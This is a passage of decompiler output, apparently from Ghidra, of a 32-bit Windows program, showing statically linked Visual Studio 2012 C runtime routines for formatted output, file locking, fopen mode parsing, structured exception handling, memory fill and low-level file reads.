                  local_420 = piVar9;
                  piVar8 = (int *)0x0;
                  piVar7 = piVar9;
                  local_410 = ppiVar15;
                  local_40c = puVar3;
                  if (0 < (int)piVar11) {
                    do {
                      piVar8 = local_418;
                      if (*(byte *)local_420 == 0) break;
                      iVar5 = __isleadbyte_l((uint)*(byte *)local_420,&local_450);
                      if (iVar5 != 0) {
                        local_420 = (int *)((int)local_420 + 1);
                      }
                      local_420 = (int *)((int)local_420 + 1);
                      piVar8 = (int *)((int)local_418 + 1);
                      local_418 = piVar8;
                    } while ((int)piVar8 < (int)piVar11);
                  }
                }
                goto LAB_004088bc;
              }
              if (local_420 == (int *)0x75) goto LAB_004085bc;
              local_40c = puVar3;
              if (local_420 != (int *)0x78) goto LAB_004088bc;
              local_458 = 0x27;
LAB_00408735:
              local_420 = (int *)0x10;
              if ((char)piVar10 < '\0') {
                local_43a = (short)local_458 + 0x51;
                local_43c = L'0';
                local_430 = 2;
              }
              goto LAB_004085c6;
            }
            if (local_420 == (int *)0x70) {
              local_41c = (int *)0x8;
LAB_00408715:
              local_458 = 7;
              goto LAB_00408735;
            }
            local_40c = puVar3;
            if (local_420 < (int *)0x65) goto LAB_004088bc;
            if (local_420 < (int *)0x68) goto LAB_00408335;
            if (local_420 == (int *)0x69) goto LAB_004085b3;
            if (local_420 != (int *)0x6e) {
              if (local_420 != (int *)0x6f) goto LAB_004088bc;
              local_420 = (int *)0x8;
              if ((char)piVar10 < '\0') {
                piVar10 = (int *)((uint)piVar10 | 0x200);
                local_414 = piVar10;
              }
              goto LAB_004085c6;
            }
            piVar8 = *local_410;
            local_410 = local_410 + 1;
            bVar13 = FUN_0040e76b();
            if (CONCAT31(extraout_var,bVar13) == 0) {
              piVar10 = __errno();
              *piVar10 = 0x16;
              FUN_00407ceb();
              if (local_444 != '\0') {
                *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
              }
              goto LAB_00408ad5;
            }
            if (((uint)piVar10 & 0x20) == 0) {
              *piVar8 = local_424;
            }
            else {
              *(wchar_t *)piVar8 = (wchar_t)local_424;
            }
            local_454 = 1;
          }
          piVar8 = local_418;
          puVar3 = local_40c;
          if (local_45c != (int *)0x0) {
            FID_conflict__free(local_45c);
            local_45c = (int *)0x0;
            piVar8 = local_418;
            puVar3 = local_40c;
          }
          break;
        default:
          goto switchD_0040806c_caseD_9;
        case 0xbad1abe1:
          break;
        }
        local_40c = puVar3;
        local_420 = (int *)(uint)*local_40c;
        puVar3 = local_40c;
      } while (*local_40c != 0);
      local_40c = puVar3;
      if ((local_438 != 0) && (puVar3 = local_40c, local_438 != 7)) {
switchD_0040806c_caseD_9:
        local_40c = puVar3;
        piVar10 = __errno();
        *piVar10 = 0x16;
        FUN_00407ceb();
        goto LAB_00407f91;
      }
    }
    if (local_444 != '\0') {
      *(uint *)(local_448 + 0x70) = *(uint *)(local_448 + 0x70) & 0xfffffffd;
    }
  }
LAB_00408ad5:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



// Library Function - Single Match
//  _write_char
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_char(wchar_t param_1,FILE *param_2,int *param_3)

{
  wint_t wVar1;
  
  if (((*(byte *)&param_2->_flag & 0x40) == 0) || (param_2->_base != (char *)0x0)) {
    wVar1 = __fputwc_nolock(param_1,param_2);
    if (wVar1 == 0xffff) {
      *param_3 = -1;
      return;
    }
  }
  *param_3 = *param_3 + 1;
  return;
}



// Library Function - Single Match
//  _write_multi_char
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_multi_char(wchar_t param_1,int param_2,FILE *param_3,int *param_4)

{
  if (0 < param_2) {
    do {
      param_2 = param_2 + -1;
      _write_char(param_1,param_3,param_4);
      if (*param_4 == -1) {
        return;
      }
    } while (0 < param_2);
  }
  return;
}



// Library Function - Single Match
//  _write_string
// 
// Library: Visual Studio 2012 Release

void __cdecl _write_string(wchar_t *param_1,int param_2,FILE *param_3,int *param_4,int *param_5)

{
  int iVar1;
  
  iVar1 = *param_5;
  if (((*(byte *)&param_3->_flag & 0x40) == 0) || (param_3->_base != (char *)0x0)) {
    *param_5 = 0;
    if (0 < param_2) {
      do {
        param_2 = param_2 + -1;
        _write_char(*param_1,param_3,param_4);
        param_1 = param_1 + 1;
        if (*param_4 == -1) {
          if (*param_5 != 0x2a) break;
          _write_char(L'?',param_3,param_4);
        }
      } while (0 < param_2);
      if (*param_5 != 0) {
        return;
      }
    }
    *param_5 = iVar1;
  }
  else {
    *param_4 = *param_4 + param_2;
  }
  return;
}



undefined ** FUN_00408cc4(void)

{
  return &PTR_DAT_0041a1b8;
}



// Library Function - Single Match
//  __lock_file
// 
// Library: Visual Studio 2012 Release

void __cdecl __lock_file(FILE *_File)

{
  if ((_File < &PTR_DAT_0041a1b8) || ((FILE *)&DAT_0041a418 < _File)) {
    EnterCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  }
  else {
    __lock(((int)&_File[-0x20d0e]._base >> 5) + 0x10);
    _File->_flag = _File->_flag | 0x8000;
  }
  return;
}



// Library Function - Single Match
//  __lock_file2
// 
// Library: Visual Studio 2012 Release

void __cdecl __lock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    __lock(_Index + 0x10);
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) | 0x8000;
    return;
  }
  EnterCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// Library Function - Single Match
//  __unlock_file
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release, Visual Studio 2012 Release

void __cdecl __unlock_file(FILE *_File)

{
  if (((FILE *)0x41a1b7 < _File) && (_File < (FILE *)0x41a419)) {
    _File->_flag = _File->_flag & 0xffff7fff;
    FUN_0040ed0f(((int)&_File[-0x20d0e]._base >> 5) + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)(_File + 1));
  return;
}



// Library Function - Single Match
//  __unlock_file2
// 
// Library: Visual Studio 2012 Release

void __cdecl __unlock_file2(int _Index,void *_File)

{
  if (_Index < 0x14) {
    *(uint *)((int)_File + 0xc) = *(uint *)((int)_File + 0xc) & 0xffff7fff;
    FUN_0040ed0f(_Index + 0x10);
    return;
  }
  LeaveCriticalSection((LPCRITICAL_SECTION)((int)_File + 0x20));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __getstream
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl __getstream(void)

{
  int iVar1;
  void *pvVar2;
  FILE *pFVar3;
  FILE *_File;
  int _Index;
  
  pFVar3 = (FILE *)0x0;
  __lock(1);
  _Index = 0;
  do {
    _File = pFVar3;
    if (DAT_0041cf84 <= _Index) {
LAB_00408e7e:
      if (_File != (FILE *)0x0) {
        _File->_flag = _File->_flag & 0x8000;
        _File->_cnt = 0;
        _File->_base = (char *)0x0;
        _File->_ptr = (char *)0x0;
        _File->_tmpfname = (char *)0x0;
        _File->_file = -1;
      }
      FUN_00408eaf();
      return _File;
    }
    iVar1 = *(int *)(DAT_0041cf80 + _Index * 4);
    if (iVar1 == 0) {
      pvVar2 = __malloc_crt(0x38);
      *(void **)(DAT_0041cf80 + _Index * 4) = pvVar2;
      if (pvVar2 != (void *)0x0) {
        InitializeCriticalSectionAndSpinCount
                  ((LPCRITICAL_SECTION)(*(int *)(DAT_0041cf80 + _Index * 4) + 0x20),4000);
        EnterCriticalSection((LPCRITICAL_SECTION)(*(int *)(DAT_0041cf80 + _Index * 4) + 0x20));
        _File = *(FILE **)(DAT_0041cf80 + _Index * 4);
        _File->_flag = 0;
      }
      goto LAB_00408e7e;
    }
    if (((*(byte *)(iVar1 + 0xc) & 0x83) == 0) && ((*(uint *)(iVar1 + 0xc) & 0x8000) == 0)) {
      if ((_Index - 3U < 0x11) && (iVar1 = __mtinitlocknum(_Index + 0x10), iVar1 == 0))
      goto LAB_00408e7e;
      __lock_file2(_Index,*(void **)(DAT_0041cf80 + _Index * 4));
      _File = *(FILE **)(DAT_0041cf80 + _Index * 4);
      if ((*(byte *)&_File->_flag & 0x83) == 0) goto LAB_00408e7e;
      __unlock_file2(_Index,_File);
    }
    _Index = _Index + 1;
  } while( true );
}



void FUN_00408eaf(void)

{
  FUN_0040ed0f(1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __wopenfile
// 
// Library: Visual Studio 2012 Release

FILE * __cdecl __wopenfile(wchar_t *_Filename,wchar_t *_Mode,int _ShFlag,FILE *_File)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  wchar_t wVar4;
  int *piVar5;
  uint uVar6;
  int iVar7;
  errno_t eVar8;
  uint _OpenFlag;
  wchar_t *pwVar9;
  wchar_t *pwVar10;
  uint uVar11;
  int local_8;
  
  bVar3 = false;
  local_8 = 0;
  bVar2 = false;
  for (pwVar9 = _Mode; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
  }
  wVar4 = *pwVar9;
  if (wVar4 == L'a') {
    _OpenFlag = 0x109;
LAB_00408f1c:
    uVar11 = DAT_0041bd58 | 2;
  }
  else {
    if (wVar4 != L'r') {
      if (wVar4 != L'w') goto LAB_00408ef2;
      _OpenFlag = 0x301;
      goto LAB_00408f1c;
    }
    _OpenFlag = 0;
    uVar11 = DAT_0041bd58 | 1;
  }
  pwVar9 = pwVar9 + 1;
  wVar4 = *pwVar9;
  bVar1 = true;
  if (wVar4 != L'\0') {
    _Mode = (wchar_t *)0x1000;
    do {
      if (!bVar1) break;
      uVar6 = (uint)(ushort)wVar4;
      if (uVar6 < 0x54) {
        if (uVar6 == 0x53) {
          if (local_8 != 0) goto LAB_00409032;
          local_8 = 1;
          _OpenFlag = _OpenFlag | 0x20;
        }
        else if (uVar6 != 0x20) {
          if (uVar6 == 0x2b) {
            if ((_OpenFlag & 2) != 0) goto LAB_00409032;
            _OpenFlag = _OpenFlag & 0xfffffffe | 2;
            uVar11 = uVar11 & 0xfffffffc | 0x80;
          }
          else if (uVar6 == 0x2c) {
            bVar2 = true;
LAB_00409032:
            bVar1 = false;
          }
          else if (uVar6 == 0x44) {
            if ((_OpenFlag & 0x40) != 0) goto LAB_00409032;
            _OpenFlag = _OpenFlag | 0x40;
          }
          else if (uVar6 == 0x4e) {
            _OpenFlag = _OpenFlag | 0x80;
          }
          else {
            if (uVar6 != 0x52) goto LAB_00408ef2;
            if (local_8 != uVar6 - 0x52) goto LAB_00409032;
            local_8 = 1;
            _OpenFlag = _OpenFlag | 0x10;
          }
        }
      }
      else if (uVar6 == 0x54) {
        if ((_OpenFlag & 0x1000) != 0) goto LAB_00409032;
        _OpenFlag = _OpenFlag | 0x1000;
      }
      else if (uVar6 == 0x62) {
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00409032;
        _OpenFlag = _OpenFlag | 0x8000;
      }
      else if (uVar6 == 99) {
        if (bVar3) goto LAB_00409032;
        bVar3 = true;
        uVar11 = uVar11 | 0x4000;
      }
      else if (uVar6 == 0x6e) {
        if (bVar3) goto LAB_00409032;
        bVar3 = true;
        uVar11 = uVar11 & 0xffffbfff;
      }
      else {
        if (uVar6 != 0x74) goto LAB_00408ef2;
        if ((_OpenFlag & 0xc000) != 0) goto LAB_00409032;
        _OpenFlag = _OpenFlag | 0x4000;
      }
      pwVar9 = pwVar9 + 1;
      wVar4 = *pwVar9;
    } while (wVar4 != L'\0');
    if (bVar2) {
      for (; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
      }
      iVar7 = _wcsncmp((wchar_t *)&DAT_00414500,pwVar9,3);
      if (iVar7 != 0) goto LAB_00408ef2;
      for (pwVar9 = pwVar9 + 3; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
      }
      if (*pwVar9 != L'=') goto LAB_00408ef2;
      do {
        pwVar10 = pwVar9;
        pwVar9 = pwVar10 + 1;
      } while (*pwVar9 == L' ');
      iVar7 = __wcsnicmp(pwVar9,u_UTF_8_00414508,5);
      if (iVar7 == 0) {
        pwVar9 = pwVar10 + 6;
        _OpenFlag = _OpenFlag | 0x40000;
      }
      else {
        iVar7 = __wcsnicmp(pwVar9,u_UTF_16LE_00414514,8);
        if (iVar7 == 0) {
          pwVar9 = pwVar10 + 9;
          _OpenFlag = _OpenFlag | 0x20000;
        }
        else {
          iVar7 = __wcsnicmp(pwVar9,u_UNICODE_00414528,7);
          if (iVar7 != 0) goto LAB_00408ef2;
          pwVar9 = pwVar10 + 8;
          _OpenFlag = _OpenFlag | 0x10000;
        }
      }
    }
  }
  for (; *pwVar9 == L' '; pwVar9 = pwVar9 + 1) {
  }
  if (*pwVar9 == L'\0') {
    eVar8 = __wsopen_s((int *)&_Mode,_Filename,_OpenFlag,_ShFlag,0x180);
    if (eVar8 != 0) {
      return (FILE *)0x0;
    }
    _DAT_0041b24c = _DAT_0041b24c + 1;
    _File->_cnt = 0;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_tmpfname = (char *)0x0;
    _File->_flag = uVar11;
    _File->_file = (int)_Mode;
    return _File;
  }
LAB_00408ef2:
  piVar5 = __errno();
  *piVar5 = 0x16;
  FUN_00407ceb();
  return (FILE *)0x0;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  undefined4 unaff_retaddr;
  uint auStack_1c [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack_1c + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack_1c + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack_1c + iVar1 + 4) = DAT_0041a038 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack_1c + iVar1) = unaff_retaddr;
  ExceptionList = local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 unaff_retaddr;
  
  ExceptionList = (void *)unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2012 Release

undefined4 __cdecl __except_handler4(PEXCEPTION_RECORD param_1,PVOID param_2,undefined4 param_3)

{
  int iVar1;
  uint uVar2;
  code *pcVar3;
  int iVar4;
  BOOL BVar5;
  undefined4 uVar6;
  int *piVar7;
  PEXCEPTION_RECORD local_1c;
  undefined4 local_18;
  int *local_14;
  undefined4 local_10;
  uint local_c;
  char local_5;
  
  piVar7 = (int *)(*(uint *)((int)param_2 + 8) ^ DAT_0041a038);
  local_5 = '\0';
  local_10 = 1;
  iVar1 = (int)param_2 + 0x10;
  if (*piVar7 != -2) {
    ___security_check_cookie_4(piVar7[1] + iVar1 ^ *(uint *)(*piVar7 + iVar1));
  }
  ___security_check_cookie_4(piVar7[3] + iVar1 ^ *(uint *)(piVar7[2] + iVar1));
  if ((*(byte *)&param_1->ExceptionFlags & 0x66) == 0) {
    local_1c = param_1;
    local_18 = param_3;
    *(PEXCEPTION_RECORD **)((int)param_2 + -4) = &local_1c;
    local_c = *(uint *)((int)param_2 + 0xc);
    if (*(uint *)((int)param_2 + 0xc) == 0xfffffffe) {
      return local_10;
    }
    do {
      iVar4 = local_c * 3 + 4;
      uVar2 = piVar7[iVar4];
      local_14 = piVar7 + iVar4;
      if ((undefined *)piVar7[local_c * 3 + 5] != (undefined *)0x0) {
        iVar4 = __EH4_CallFilterFunc_8((undefined *)piVar7[local_c * 3 + 5]);
        local_5 = '\x01';
        if (iVar4 < 0) {
          local_10 = 0;
          goto LAB_004092fc;
        }
        if (0 < iVar4) {
          if (((param_1->ExceptionCode == 0xe06d7363) && (DAT_0041cf7c != (code *)0x0)) &&
             (BVar5 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041cf7c), BVar5 != 0)) {
            (*DAT_0041cf7c)(param_1,1);
          }
          __EH4_GlobalUnwind2_8(param_2,param_1);
          if (*(uint *)((int)param_2 + 0xc) != local_c) {
            __EH4_LocalUnwind_16((int)param_2,local_c,iVar1,&DAT_0041a038);
          }
          *(uint *)((int)param_2 + 0xc) = uVar2;
          if (*piVar7 != -2) {
            ___security_check_cookie_4(piVar7[1] + iVar1 ^ *(uint *)(*piVar7 + iVar1));
          }
          ___security_check_cookie_4(piVar7[3] + iVar1 ^ *(uint *)(piVar7[2] + iVar1));
          __EH4_TransferToHandler_8((undefined *)local_14[2]);
          pcVar3 = (code *)swi(3);
          uVar6 = (*pcVar3)();
          return uVar6;
        }
      }
      local_c = uVar2;
    } while (uVar2 != 0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
    if (*(int *)((int)param_2 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)param_2,0xfffffffe,iVar1,&DAT_0041a038);
  }
LAB_004092fc:
  if (*piVar7 != -2) {
    ___security_check_cookie_4(piVar7[1] + iVar1 ^ *(uint *)(*piVar7 + iVar1));
  }
  ___security_check_cookie_4(piVar7[3] + iVar1 ^ *(uint *)(piVar7[2] + iVar1));
  return local_10;
}



// Library Function - Single Match
//  __local_unwind4
// 
// Library: Visual Studio 2012 Release

void __cdecl __local_unwind4(uint *param_1,int param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  void *pvStack_28;
  undefined *puStack_24;
  uint local_20;
  uint uStack_1c;
  int iStack_18;
  uint *puStack_14;
  
  puStack_14 = param_1;
  iStack_18 = param_2;
  uStack_1c = param_3;
  puStack_24 = &LAB_004093f0;
  pvStack_28 = ExceptionList;
  local_20 = DAT_0041a038 ^ (uint)&pvStack_28;
  ExceptionList = &pvStack_28;
  while( true ) {
    uVar2 = *(uint *)(param_2 + 0xc);
    if ((uVar2 == 0xfffffffe) || ((param_3 != 0xfffffffe && (uVar2 <= param_3)))) break;
    puVar1 = (undefined4 *)((*(uint *)(param_2 + 8) ^ *param_1) + 0x10 + uVar2 * 0xc);
    *(undefined4 *)(param_2 + 0xc) = *puVar1;
    if (puVar1[1] == 0) {
      __NLG_Notify(0x101);
      FUN_0040fa54();
    }
  }
  ExceptionList = pvStack_28;
  return;
}



void FUN_00409436(int param_1)

{
  __local_unwind4(*(uint **)(param_1 + 0x28),*(int *)(param_1 + 0x18),*(uint *)(param_1 + 0x1c));
  return;
}



// Library Function - Single Match
//  @_EH4_CallFilterFunc@8
// 
// Library: Visual Studio 2012 Release

void __fastcall __EH4_CallFilterFunc_8(undefined *param_1)

{
  (*(code *)param_1)();
  return;
}



// Library Function - Single Match
//  @_EH4_TransferToHandler@8
// 
// Library: Visual Studio 2012 Release

void __fastcall __EH4_TransferToHandler_8(undefined *UNRECOVERED_JUMPTABLE)

{
  __NLG_Notify(1);
                    // WARNING: Could not recover jumptable at 0x00409480. Too many branches
                    // WARNING: Treating indirect jump as call
  (*(code *)UNRECOVERED_JUMPTABLE)();
  return;
}



// Library Function - Single Match
//  @_EH4_GlobalUnwind2@8
// 
// Library: Visual Studio 2012 Release

void __fastcall __EH4_GlobalUnwind2_8(PVOID param_1,PEXCEPTION_RECORD param_2)

{
  RtlUnwind(param_1,(PVOID)0x409496,param_2,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  @_EH4_LocalUnwind@16
// 
// Library: Visual Studio 2012 Release

void __fastcall __EH4_LocalUnwind_16(int param_1,uint param_2,undefined4 param_3,uint *param_4)

{
  __local_unwind4(param_4,param_1,param_2);
  return;
}



uint __cdecl FUN_004094b2(FILE *param_1)

{
  byte bVar1;
  int *piVar2;
  uint uVar3;
  uint uVar4;
  int iVar5;
  undefined *puVar6;
  LPWSTR pWVar7;
  
  if (param_1 == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    FUN_00407ceb();
  }
  else {
    uVar4 = param_1->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        param_1->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(param_1);
        }
        else {
          param_1->_ptr = param_1->_base;
        }
        uVar4 = param_1->_bufsiz;
        pWVar7 = (LPWSTR)param_1->_base;
        uVar3 = __fileno(param_1);
        uVar4 = FUN_00409690(uVar3,pWVar7,uVar4);
        param_1->_cnt = uVar4;
        if ((uVar4 != 0) && (uVar4 != 0xffffffff)) {
          if ((*(byte *)&param_1->_flag & 0x82) == 0) {
            iVar5 = __fileno(param_1);
            if ((iVar5 == -1) || (iVar5 = __fileno(param_1), iVar5 == -2)) {
              puVar6 = &DAT_0041a548;
            }
            else {
              iVar5 = __fileno(param_1);
              uVar4 = __fileno(param_1);
              puVar6 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_0041b8c0)[iVar5 >> 5]);
            }
            if ((puVar6[4] & 0x82) == 0x82) {
              param_1->_flag = param_1->_flag | 0x2000;
            }
          }
          if (((param_1->_bufsiz == 0x200) && ((*(byte *)&param_1->_flag & 8) != 0)) &&
             ((param_1->_flag & 0x400U) == 0)) {
            param_1->_bufsiz = 0x1000;
          }
          param_1->_cnt = param_1->_cnt + -1;
          bVar1 = *param_1->_ptr;
          param_1->_ptr = param_1->_ptr + 1;
          return (uint)bVar1;
        }
        param_1->_flag = param_1->_flag | (-(uint)(uVar4 != 0) & 0x10) + 0x10;
        param_1->_cnt = 0;
      }
      else {
        param_1->_flag = uVar4 | 0x20;
      }
    }
  }
  return 0xffffffff;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2012 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_00407ceb();
    return -1;
  }
  return _File->_file;
}



uint * __cdecl FUN_00409600(uint *param_1,byte param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  uint uVar3;
  uint *puVar4;
  
  if (param_3 == 0) {
    return param_1;
  }
  uVar1 = (uint)param_2;
  puVar4 = param_1;
  if ((DAT_0041bbd4 >> 1 & 1) == 0) {
    if ((0x7f < (int)param_3) && ((DAT_0041a588 >> 1 & 1) != 0)) {
      if (uVar1 == 0) {
        uVar1 = 0;
      }
      else {
        uVar1 = CONCAT22(CONCAT11(param_2,param_2),CONCAT11(param_2,param_2));
      }
      if (((uint)param_1 & 0xf) != 0) {
        uVar2 = 0x10 - ((uint)param_1 & 0xf);
        param_3 = param_3 - uVar2;
        for (uVar3 = uVar2 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {
          *(byte *)puVar4 = param_2;
          puVar4 = (uint *)((int)puVar4 + 1);
        }
        for (uVar2 = uVar2 >> 2; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar4 = uVar1;
          puVar4 = puVar4 + 1;
        }
      }
      for (uVar3 = param_3 >> 7; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar4 = uVar1;
        puVar4[1] = uVar1;
        puVar4[2] = uVar1;
        puVar4[3] = uVar1;
        puVar4[4] = uVar1;
        puVar4[5] = uVar1;
        puVar4[6] = uVar1;
        puVar4[7] = uVar1;
        puVar4[8] = uVar1;
        puVar4[9] = uVar1;
        puVar4[10] = uVar1;
        puVar4[0xb] = uVar1;
        puVar4[0xc] = uVar1;
        puVar4[0xd] = uVar1;
        puVar4[0xe] = uVar1;
        puVar4[0xf] = uVar1;
        puVar4[0x10] = uVar1;
        puVar4[0x11] = uVar1;
        puVar4[0x12] = uVar1;
        puVar4[0x13] = uVar1;
        puVar4[0x14] = uVar1;
        puVar4[0x15] = uVar1;
        puVar4[0x16] = uVar1;
        puVar4[0x17] = uVar1;
        puVar4[0x18] = uVar1;
        puVar4[0x19] = uVar1;
        puVar4[0x1a] = uVar1;
        puVar4[0x1b] = uVar1;
        puVar4[0x1c] = uVar1;
        puVar4[0x1d] = uVar1;
        puVar4[0x1e] = uVar1;
        puVar4[0x1f] = uVar1;
        puVar4 = puVar4 + 0x20;
      }
      if ((param_3 & 0x7f) != 0) {
        for (uVar3 = (param_3 & 0x7f) >> 4; uVar3 != 0; uVar3 = uVar3 - 1) {
          *puVar4 = uVar1;
          puVar4[1] = uVar1;
          puVar4[2] = uVar1;
          puVar4[3] = uVar1;
          puVar4 = puVar4 + 4;
        }
        if ((param_3 & 0xf) != 0) {
          for (uVar3 = (param_3 & 0xf) >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar4 = uVar1;
            puVar4 = puVar4 + 1;
          }
          for (uVar1 = param_3 & 3; uVar1 != 0; uVar1 = uVar1 - 1) {
            *(byte *)puVar4 = param_2;
            puVar4 = (uint *)((int)puVar4 + 1);
          }
        }
      }
      return param_1;
    }
    if (3 < param_3) {
      uVar2 = -(int)param_1 & 3;
      uVar3 = param_3;
      if (uVar2 != 0) {
        uVar3 = param_3 - uVar2;
        do {
          *(byte *)puVar4 = param_2;
          puVar4 = (uint *)((int)puVar4 + 1);
          uVar2 = uVar2 - 1;
        } while (uVar2 != 0);
      }
      uVar1 = uVar1 * 0x1010101;
      param_3 = uVar3 & 3;
      uVar3 = uVar3 >> 2;
      if (uVar3 != 0) {
        for (; uVar3 != 0; uVar3 = uVar3 - 1) {
          *puVar4 = uVar1;
          puVar4 = puVar4 + 1;
        }
        if (param_3 == 0) {
          return param_1;
        }
      }
    }
    do {
      *(char *)puVar4 = (char)uVar1;
      puVar4 = (uint *)((int)puVar4 + 1);
      param_3 = param_3 - 1;
    } while (param_3 != 0);
  }
  else {
    for (; param_3 != 0; param_3 = param_3 - 1) {
      *(byte *)puVar4 = param_2;
      puVar4 = (uint *)((int)puVar4 + 1);
    }
  }
  return param_1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3

uint __cdecl FUN_00409690(uint param_1,LPWSTR param_2,uint param_3)

{
  ulong *puVar1;
  int *piVar2;
  uint uVar3;
  int iVar4;
  
  if (param_1 == 0xfffffffe) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return 0xffffffff;
  }
  if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
    iVar4 = (param_1 & 0x1f) * 0x40;
    if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) != 0) {
      if (param_3 < 0x80000000) {
        ___lock_fhandle(param_1);
        if ((*(byte *)((&DAT_0041b8c0)[(int)param_1 >> 5] + 4 + iVar4) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          uVar3 = 0xffffffff;
        }
        else {
          uVar3 = FUN_00409798(param_1,param_2,param_3);
        }
        FUN_0040976f();
        return uVar3;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0040978a;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0040978a:
  FUN_00407ceb();
  return 0xffffffff;
}



void FUN_0040976f(void)

{
  int unaff_ESI;
  
  __unlock_fhandle(unaff_ESI);
  return;
}



uint __cdecl FUN_00409798(uint param_1,LPWSTR param_2,uint param_3)

{
  byte *pbVar1;
  char cVar2;
  char cVar3;
  byte bVar4;
  WCHAR WVar5;
  ulong *puVar6;
  int *piVar7;
  undefined3 extraout_var;
  BOOL BVar8;
  ulong uVar9;
  DWORD DVar10;
  int iVar11;
  int iVar12;
  size_t _Size;
  uint uVar13;
  LPWSTR pWVar14;
  LPWSTR pWVar15;
  int unaff_EDI;
  uint uVar16;
  LPWSTR pWVar17;
  WCHAR *pWVar18;
  bool bVar19;
  longlong lVar20;
  WCHAR *local_24;
  LPWSTR local_20;
  uint local_1c;
  uint local_18;
  LPWSTR local_14;
  int local_10;
  undefined2 local_c;
  char local_5;
  
  uVar16 = 0;
  local_24 = (WCHAR *)0x0;
  local_1c = 0xfffffffe;
  if (param_1 == 0xfffffffe) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 9;
    return 0xffffffff;
  }
  if ((-1 < (int)param_1) && (param_1 < DAT_0041cf60)) {
    local_10 = (int)param_1 >> 5;
    iVar12 = (param_1 & 0x1f) * 0x40;
    bVar4 = *(byte *)((&DAT_0041b8c0)[local_10] + 4 + iVar12);
    if ((bVar4 & 1) != 0) {
      if (param_3 < 0x80000000) {
        if ((param_3 == 0) || ((bVar4 & 2) != 0)) {
          return 0;
        }
        if (param_2 != (LPWSTR)0x0) {
          cVar3 = (char)(*(char *)((&DAT_0041b8c0)[local_10] + 0x24 + iVar12) * '\x02') >> 1;
          if (cVar3 == '\x01') {
            if ((~param_3 & 1) == 0) goto LAB_0040983e;
            _Size = param_3 >> 1;
            if (_Size < 4) {
              _Size = 4;
            }
            local_14 = (LPWSTR)__malloc_crt(_Size);
            if (local_14 == (LPWSTR)0x0) {
              piVar7 = __errno();
              *piVar7 = 0xc;
              puVar6 = ___doserrno();
              *puVar6 = 8;
              return 0xffffffff;
            }
            lVar20 = __lseeki64_nolock(param_1,0x100000000,unaff_EDI);
            iVar11 = (&DAT_0041b8c0)[local_10];
